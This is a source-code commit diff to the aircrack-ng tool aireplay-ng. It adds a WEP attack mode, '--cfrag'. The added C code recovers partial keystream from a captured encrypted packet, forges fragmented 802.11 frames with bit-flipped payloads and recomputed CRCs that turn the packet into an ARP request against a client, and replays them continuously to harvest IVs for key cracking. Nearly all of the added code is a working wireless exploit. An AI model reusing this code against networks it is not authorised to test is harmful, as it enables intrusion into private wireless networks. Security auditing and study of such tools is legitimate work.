4ad5ed99eb0b1225f7362a8829a5c3d69dfb21f3
Martin Beck <hirte@aircrack-ng.org>
2008-03-04 00:29:59 +0000

    aireplay-ng: Added new Attack "--cfrag". Turns every IP and ARP packet into an ARP request against the client.
    git-svn-id: http://svn.aircrack-ng.org/trunk@977 28c6078b-6c39-48e3-add9-af49d547ecab

--- src/aireplay-ng.c
+++ src/aireplay-ng.c
@@ -79,7 +79,7 @@
 #define ETH_P_80211_RAW 25
 #endif
 
-#define RTC_RESOLUTION  1024
+#define RTC_RESOLUTION  8192
 
 #define REQUESTS    30
 #define MAX_APS     20
@@ -217,6 +217,7 @@ char usage[] =
 "      --chopchop          : decrypt/chopchop WEP packet (-4)\n"
 "      --fragment          : generates valid keystream   (-5)\n"
 "      --caffe-latte       : query a client for new IVs  (-6)\n"
+"      --cfrag             : fragments against a client  (-7)\n"
 "      --test              : tests injection and quality (-9)\n"
 "\n"
 "      --help              : Displays this usage screen\n"
@@ -2883,6 +2884,341 @@ add_arp:
     return( 0 );
 }
 
+int set_clear_arp(uchar *buf, uchar *smac, uchar *dmac) //set first 22 bytes
+{
+    if(buf == NULL)
+        return -1;
+
+    memcpy(buf, S_LLC_SNAP_ARP, 8);
+    buf[8]  = 0x00;
+    buf[9]  = 0x01; //ethernet
+    buf[10] = 0x08; // IP
+    buf[11] = 0x00;
+    buf[12] = 0x06; //hardware size
+    buf[13] = 0x04; //protocol size
+    buf[14] = 0x00;
+    if(memcmp(dmac, BROADCAST, 6) == 0)
+        buf[15]  = 0x01; //request
+    else
+        buf[15]  = 0x02; //reply
+    memcpy(buf+16, smac, 6);
+
+    return 0;
+}
+
+int set_final_arp(uchar *buf, uchar *mymac)
+{
+    if(buf == NULL)
+        return -1;
+
+    //shifted by 10bytes to set source IP as target IP :)
+
+    buf[0] = 0x08; // IP
+    buf[1] = 0x00;
+    buf[2] = 0x06; //hardware size
+    buf[3] = 0x04; //protocol size
+    buf[4] = 0x00;
+    buf[5] = 0x01; //request
+    memcpy(buf+6, mymac, 6); //sender mac
+    buf[12] = 0xA9; //sender IP 169.254.87.197
+    buf[13] = 0xFE;
+    buf[14] = 0x57;
+    buf[15] = 0xC5; //end sender IP
+
+    return 0;
+}
+
+int set_clear_ip(uchar *buf) //set first 9 bytes
+{
+    if(buf == NULL)
+        return -1;
+
+    memcpy(buf, S_LLC_SNAP_IP, 8);
+    buf[8]  = 0x45;
+
+    return 0;
+}
+
+int set_final_ip(uchar *buf, uchar *mymac)
+{
+    if(buf == NULL)
+        return -1;
+
+    //shifted by 10bytes to set source IP as target IP :)
+
+    buf[0] = 0x06; //hardware size
+    buf[1] = 0x04; //protocol size
+    buf[2] = 0x00;
+    buf[3] = 0x01; //request
+    memcpy(buf+4, mymac, 5); //sender mac
+
+    return 0;
+}
+
+int do_attack_cfrag( void )
+{
+    int caplen, n;
+    struct timeval tv;
+    struct timeval tv2;
+    float f, ticks[3];
+    unsigned char bssid[6];
+    unsigned char smac[6];
+    unsigned char dmac[6];
+    uchar keystream[128];
+    uchar frag1[128], frag2[128], frag3[128];
+    uchar clear[4096], final[4096], flip[4096];
+    int isarp;
+    int z, i;
+
+    opt.f_tods = 1;
+
+read_packets:
+
+    if( capture_ask_packet( &caplen, 0 ) != 0 )
+        return( 1 );
+
+    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
+
+    if(caplen < z)
+    {
+        goto read_packets;
+    }
+
+    if(caplen > 3800)
+    {
+        goto read_packets;
+    }
+
+    switch( h80211[1] & 3 )
+    {
+        case  0:
+            memcpy( bssid, h80211 + 16, 6 );
+            memcpy( dmac, h80211 + 4, 6 );
+            memcpy( smac, h80211 + 10, 6 );
+            break;
+        case  1:
+            memcpy( bssid, h80211 + 4, 6 );
+            memcpy( dmac, h80211 + 16, 6 );
+            memcpy( smac, h80211 + 10, 6 );
+            break;
+        case  2:
+            memcpy( bssid, h80211 + 10, 6 );
+            memcpy( dmac, h80211 + 4, 6 );
+            memcpy( smac, h80211 + 16, 6 );
+            break;
+        default:
+            memcpy( bssid, h80211 + 10, 6 );
+            memcpy( dmac, h80211 + 16, 6 );
+            memcpy( smac, h80211 + 24, 6 );
+            break;
+    }
+
+    bzero(clear, 4096);
+    bzero(final, 4096);
+    bzero(flip, 4096);
+    bzero(frag1, 128);
+    bzero(frag2, 128);
+    bzero(frag3, 128);
+    bzero(keystream, 128);
+
+    /* check if it's a potential ARP request */
+
+    //its length 68 or 86 and going to broadcast or a unicast mac (even first byte)
+    if( (caplen == 68 || caplen == 86) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )
+    {
+        /* process ARP */
+        printf("Found ARP packet\n");
+        isarp = 1;
+        //build the new packet
+        set_clear_arp(clear, smac, dmac);
+        set_final_arp(final, opt.r_smac);
+
+        for(i=0; i<14; i++)
+            keystream[i] = (h80211+z+4)[i] ^ clear[i];
+
+        // correct 80211 header
+        h80211[0] = 0x08;    //data
+        h80211[1] = 0x42;    //wep+FromDS
+        memcpy(h80211+4, smac, 6);
+        memcpy(h80211+10, bssid, 6);
+        memcpy(h80211+16, opt.r_smac, 6);
+        h80211[22] = 0xD0; //frag = 0;
+        h80211[23] = 0x50;
+
+        //need to shift by 10 bytes; (add 1 frag in front)
+        memcpy(frag1, h80211, z+4); //copy 80211 header and IV
+        frag1[1] |= 0x04; //more frags
+        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 8);
+        frag1[z+4+8] = 0x00;
+        frag1[z+4+9] = 0x01; //ethernet
+        add_crc32(frag1+z+4, 10);
+        for(i=0; i<14; i++)
+            (frag1+z+4)[i] ^= keystream[i];
+        /* frag1 finished */
+
+        for(i=0; i<caplen; i++)
+            flip[i] = clear[i] ^ final[i];
+
+        add_crc32_plain(flip, caplen-z-4-4);
+
+        for(i=0; i<caplen-z-4; i++)
+            (h80211+z+4)[i] ^= flip[i];
+        h80211[22] = 0xD1; // frag = 1;
+
+        //ready to send frag1 / len=z+4+10+4 and h80211 / len = caplen
+    }
+    else
+    {
+        /* process IP */
+        printf("Found IP packet\n");
+        isarp = 0;
+        //build the new packet
+        set_clear_ip(clear);
+        set_final_ip(final, opt.r_smac);
+
+        for(i=0; i<8; i++)
+            keystream[i] = (h80211+z+4)[i] ^ clear[i];
+
+        // correct 80211 header
+        h80211[0] = 0x08;    //data
+        h80211[1] = 0x42;    //wep+FromDS
+        memcpy(h80211+4, smac, 6);
+        memcpy(h80211+10, bssid, 6);
+        memcpy(h80211+16, opt.r_smac, 6);
+        h80211[22] = 0xD0; //frag = 0;
+        h80211[23] = 0x50;
+
+        //need to shift by 12 bytes;(add 3 frags in front)
+        memcpy(frag1, h80211, z+4); //copy 80211 header and IV
+        memcpy(frag2, h80211, z+4); //copy 80211 header and IV
+        memcpy(frag3, h80211, z+4); //copy 80211 header and IV
+        frag1[1] |= 0x04; //more frags
+        frag2[1] |= 0x04; //more frags
+        frag3[1] |= 0x04; //more frags
+
+        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 4);
+        add_crc32(frag1+z+4, 4);
+        for(i=0; i<8; i++)
+            (frag1+z+4)[i] ^= keystream[i];
+
+        memcpy(frag2+z+4, S_LLC_SNAP_ARP+4, 4);
+        add_crc32(frag2+z+4, 4);
+        for(i=0; i<8; i++)
+            (frag2+z+4)[i] ^= keystream[i];
+        frag2[22] = 0xD1; //frag = 1;
+
+        frag3[z+4+0] = 0x00;
+        frag3[z+4+1] = 0x01; //ether
+        frag3[z+4+2] = 0x08; //IP
+        frag3[z+4+3] = 0x00;
+        add_crc32(frag3+z+4, 4);
+        for(i=0; i<8; i++)
+            (frag3+z+4)[i] ^= keystream[i];
+        frag3[22] = 0xD2; //frag = 2;
+        /* frag1,2,3 finished */
+
+        for(i=0; i<caplen; i++)
+            flip[i] = clear[i] ^ final[i];
+
+        add_crc32_plain(flip, caplen-z-4-4);
+
+        for(i=0; i<caplen-z-4; i++)
+            (h80211+z+4)[i] ^= flip[i];
+        h80211[22] = 0xD3; // frag = 3;
+
+        //ready to send frag1,2,3 / len=z+4+4+4 and h80211 / len = caplen
+    }
+
+
+    /* loop resending the packet */
+
+	/* Check if airodump-ng is running. If not, print that message */
+    printf( "You should also start airodump-ng to capture replies.\n\n" );
+
+    signal( SIGINT, sighandler );
+    ctrl_c = 0;
+
+    memset( ticks, 0, sizeof( ticks ) );
+
+    nb_pkt_sent = 0;
+
+    while( 1 )
+    {
+        if( ctrl_c )
+            goto read_packets;
+
+        /* wait for the next timer interrupt, or sleep */
+
+        if( dev.fd_rtc >= 0 )
+        {
+            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
+            {
+                perror( "read(/dev/rtc) failed" );
+                return( 1 );
+            }
+
+            ticks[0]++;
+            ticks[1]++;
+            ticks[2]++;
+        }
+        else
+        {
+            /* we can't trust usleep, since it depends on the HZ */
+
+            gettimeofday( &tv,  NULL );
+            usleep( 1000000/RTC_RESOLUTION );
+            gettimeofday( &tv2, NULL );
+
+            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
+                        + (float) ( tv2.tv_usec - tv.tv_usec );
+
+            ticks[0] += f / ( 1000000/RTC_RESOLUTION );
+            ticks[1] += f / ( 1000000/RTC_RESOLUTION );
+            ticks[2] += f / ( 1000000/RTC_RESOLUTION );
+        }
+
+        /* update the status line */
+
+        if( ticks[1] > (RTC_RESOLUTION/10) )
+        {
+            ticks[1] = 0;
+            printf( "\rSent %ld packets...(%d pps)\33[K\r", nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)));
+            fflush( stdout );
+        }
+
+        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION < 1 )
+            continue;
+
+        /* threshold reached */
+
+        ticks[2] = 0;
+
+        if( nb_pkt_sent == 0 )
+            ticks[0] = 0;
+
+        if(isarp)
+        {
+            if( send_packet( frag1, z+4+10+4 ) < 0 )
+                return( 1 );
+            nb_pkt_sent--;
+        }
+        else
+        {
+            if( send_packet( frag1, z+4+4+4 ) < 0 )
+                return( 1 );
+            if( send_packet( frag2, z+4+4+4 ) < 0 )
+                return( 1 );
+            if( send_packet( frag3, z+4+4+4 ) < 0 )
+                return( 1 );
+            nb_pkt_sent-=3;
+        }
+        if( send_packet( h80211, caplen ) < 0 )
+            return( 1 );
+    }
+
+    return( 0 );
+}
+
 int do_attack_chopchop( void )
 {
     float f, ticks[4];
@@ -5211,6 +5547,7 @@ int main( int argc, char *argv[] )
             {"chopchop",    0, 0, '4'},
             {"fragment",    0, 0, '5'},
             {"caffe-latte", 0, 0, '6'},
+            {"cfrag",       0, 0, '7'},
             {"test",        0, 0, '9'},
             {"help",        0, 0, 'H'},
             {"fast",        0, 0, 'F'},
@@ -5219,7 +5556,7 @@ int main( int argc, char *argv[] )
         };
 
         int option = getopt_long( argc, argv,
-                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:ji:r:k:l:y:o:q:0:1:234569HFBD",
+                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:ji:r:k:l:y:o:q:0:1:2345679HFBD",
                         long_options, &option_index );
 
         if( option < 0 ) break;
@@ -5607,6 +5944,17 @@ int main( int argc, char *argv[] )
                 opt.a_mode = 6;
                 break;
 
+            case '7' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return( 1 );
+                }
+                opt.a_mode = 7;
+                break;
+
             case '9' :
 
                 if( opt.a_mode != -1 )
@@ -5843,6 +6191,7 @@ usage:
         case 4 : return( do_attack_chopchop()    );
         case 5 : return( do_attack_fragment()    );
         case 6 : return( do_attack_caffe_latte() );
+        case 7 : return( do_attack_cfrag()       );
         case 9 : return( do_attack_test()        );
         default: break;
     }
